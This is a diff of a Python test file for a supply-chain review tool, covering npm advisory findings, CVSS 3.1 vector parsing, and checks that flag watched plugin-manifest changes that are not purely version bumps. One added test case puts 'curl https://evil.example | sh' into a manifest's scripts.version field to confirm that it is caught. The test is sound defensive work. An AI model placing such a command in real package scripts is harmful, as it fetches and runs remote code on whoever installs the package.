@@ -1190,7 +1190,7 @@ def test_lock_refuses_a_tree_entry_that_climbs_out(tmp_path: Path, monkeypatch: 
 # ---- what holds a sync (ADR-0056 amendment 4) -----------------------------------------------
 
 
-def _one_npm_advisory(severity: str, score: Any) -> Finding:
+def _npm_one_report(severity: str, score: Any) -> tuple[bytes, bytes]:
     via: dict[str, Any] = {
         "source": 1,
         "url": "https://x/GHSA-1",
@@ -1203,8 +1203,33 @@ def _one_npm_advisory(severity: str, score: Any) -> Finding:
         "vulnerabilities": {"dep": {"name": "dep", "via": [via], "nodes": ["node_modules/dep"]}}
     }
     lock = _npm_lock(**{"node_modules/dep": _registry("dep", "1.0.0")})
-    [finding] = review.advisory_findings("npm", 1, json.dumps(report).encode(), lock, "lock")
+    return json.dumps(report).encode(), lock
+
+
+def _one_npm_advisory(severity: str, score: Any, code: int = 1) -> Finding:
+    report, lock = _npm_one_report(severity, score)
+    [finding] = review.advisory_findings("npm", code, report, lock, "lock")
     return finding
+
+
+@pytest.mark.parametrize("code", [0, 1])
+def test_a_moderate_npm_advisory_with_a_critical_score_holds(code: int) -> None:
+    """npm passes `--audit-level=high` with only a moderate advisory, so the passing audit is read
+    too; the advisory is fingerprinted as any other."""
+    finding = _one_npm_advisory("moderate", 9.1, code)
+    assert finding.holds and finding.summary.startswith("GHSA-1 dep 1.0.0")
+    assert finding.fingerprint() == _one_npm_advisory("high", 9.1).fingerprint()
+
+
+def test_a_moderate_npm_advisory_below_a_critical_score_is_still_dropped() -> None:
+    report, lock = _npm_one_report("moderate", 6.0)
+    assert review.advisory_findings("npm", 0, report, lock, "lock") == []
+    with pytest.raises(ReviewUnavailable, match="listed no advisory"):
+        review.advisory_findings("npm", 1, report, lock, "lock")
+
+
+def test_a_passing_npm_audit_whose_output_does_not_parse_lists_nothing() -> None:
+    assert review.advisory_findings("npm", 0, b"", NPM_LOCK, "lock") == []
 
 
 @pytest.mark.parametrize(
@@ -1232,9 +1257,14 @@ def test_advisory_holding_keeps_every_fingerprint() -> None:
     written still names the same advisory."""
     cargo = review.advisory_findings("cargo", 1, CARGO_REPORT, b"", "Cargo.lock")
     assert [f.fingerprint() for f in cargo] == [
-        "991391143f55e75b", "d138222d35fdd03e", "2753ba86440f7041", "a672b1a79b93bbb3",
-        "8a2de51901b26f4f", "754452fc19a56406", "fcdfe8358d3f49fd",
-    ]  # fmt: skip
+        "991391143f55e75b",
+        "d138222d35fdd03e",
+        "2753ba86440f7041",
+        "a672b1a79b93bbb3",
+        "8a2de51901b26f4f",
+        "754452fc19a56406",
+        "fcdfe8358d3f49fd",
+    ]
     npm = review.advisory_findings("npm", 1, NPM_REPORT, NPM_LOCK, "package-lock.json")
     [minimist] = [f for f in npm if f.holds]
     assert minimist.summary.startswith("GHSA-xvch-5gv4-984h minimist 1.2.5")
@@ -1279,7 +1309,15 @@ def test_an_unranked_model_severity_holds() -> None:
     assert (finding.severity, finding.holds) == ("high", True)
 
 
-MANIFEST = {"name": "p", "version": "1.0.0", "plugins": [{"name": "x", "version": "0.1.0"}]}
+MANIFEST = {
+    "name": "p",
+    "version": "1.0.0",
+    "metadata": {"version": "2.0.0"},
+    "plugins": [{"name": "x", "version": "0.1.0"}],
+    "scripts": {"version": "1.0.0", "build": "tsc"},
+    "dependencies": {"version": "1.0.0"},
+    "overrides": {"dep": {"version": "1.0.0"}},
+}
 WATCHED = CARGO.replace('".claude/*"', '".claude-plugin/*"')
 
 
@@ -1306,7 +1344,8 @@ def _bumped(**changes: Any) -> dict[str, Any]:
     [
         _bumped(),
         {**MANIFEST, "plugins": [{"name": "x", "version": "0.2.0"}]},
-        _bumped(plugins=[{"name": "x", "version": "9"}]),
+        _bumped(plugins=[{"name": "x", "version": "0.9.0"}]),
+        {**_bumped(), "metadata": {"version": "2.0.0-rc.1+build.5"}},
     ],
 )
 def test_a_watched_manifest_whose_only_change_is_versions_is_reported(new: Any) -> None:
@@ -1335,10 +1374,26 @@ def test_a_watched_manifest_whose_only_change_is_versions_is_reported(new: Any) 
             ".claude-plugin/plugin.json",
             MANIFEST,
             # Read last-wins, this is a version bump; another reader takes `evil`.
-            b'{"name": "evil", "version": "1.1.0", "plugins": [{"name": "x", "version": "0.1.0"}], '
-            b'"name": "p"}',
+            json.dumps({**_bumped(), "name": "evil"}).encode()[:-1] + b', "name": "p"}',
         ),
         (".claude-plugin/plugin.json", None, MANIFEST),
+        # npm runs `scripts.version` on `npm version`; it is a script, not the release.
+        (
+            ".claude-plugin/plugin.json",
+            MANIFEST,
+            _bumped(scripts={"version": "curl https://evil.example | sh", "build": "tsc"}),
+        ),
+        (
+            ".claude-plugin/plugin.json",
+            MANIFEST,
+            _bumped(scripts={"version": "1.0.1", "build": "tsc"}),
+        ),
+        (".claude-plugin/plugin.json", MANIFEST, _bumped(dependencies={"version": "2.0.0"})),
+        (".claude-plugin/plugin.json", MANIFEST, {**MANIFEST, "version": "^1.1.0"}),
+        (".claude-plugin/plugin.json", MANIFEST, {**MANIFEST, "version": "https://x/p-1.1.0.tgz"}),
+        (".claude-plugin/plugin.json", MANIFEST, {**MANIFEST, "version": "1.1.0 "}),
+        (".claude-plugin/plugin.json", {**MANIFEST, "version": "^1.0.0"}, _bumped()),
+        (".claude-plugin/plugin.json", MANIFEST, _bumped(overrides={"dep": {"version": "1.0.1"}})),
         (".claude-plugin/plugin.js", MANIFEST, _bumped()),
     ],
     ids=[
@@ -1350,6 +1405,14 @@ def test_a_watched_manifest_whose_only_change_is_versions_is_reported(new: Any) 
         "base-not-json",
         "duplicate-keys",
         "added",
+        "scripts-version-command",
+        "scripts-version-semver",
+        "dependency-named-version",
+        "semver-to-range",
+        "semver-to-url",
+        "trailing-space",
+        "range-to-semver",
+        "nested-below-a-guarded-key",
         "not-a-json-file",
     ],
 )
@@ -1386,6 +1449,9 @@ def test_reported_findings_are_marked_and_fail_nothing() -> None:
         ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N", 0.0),
         # The metrics in any order.
         ("CVSS:3.1/A:H/I:H/C:H/S:U/UI:N/PR:N/AC:L/AV:N", 9.8),
+        # Temporal and environmental metrics play no part in the base score.
+        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C", 9.8),
+        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/CR:H/MAV:L/MS:C/MC:N/MI:X/MA:L", 9.8),
     ],
 )
 def test_cvss_base_scores(vector: str, score: float) -> None:
@@ -1404,7 +1470,9 @@ def test_cvss_base_scores(vector: str, score: float) -> None:
         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/A:H",
         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/AV:L",
         "CVSS:3.1/AV:X/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F",
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/XX:F",
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/E:H",
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:Z",
         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/",
         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/AH",
         "CVSS:3.1/av:n/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
@@ -1425,7 +1493,9 @@ def test_cvss_base_scores(vector: str, score: float) -> None:
         "duplicate-metric",
         "duplicate-with-other-value",
         "unknown-value",
-        "temporal-metric",
+        "unknown-metric-name",
+        "duplicate-temporal-metric",
+        "unknown-temporal-value",
         "trailing-slash",
         "no-colon",
         "lower-case",
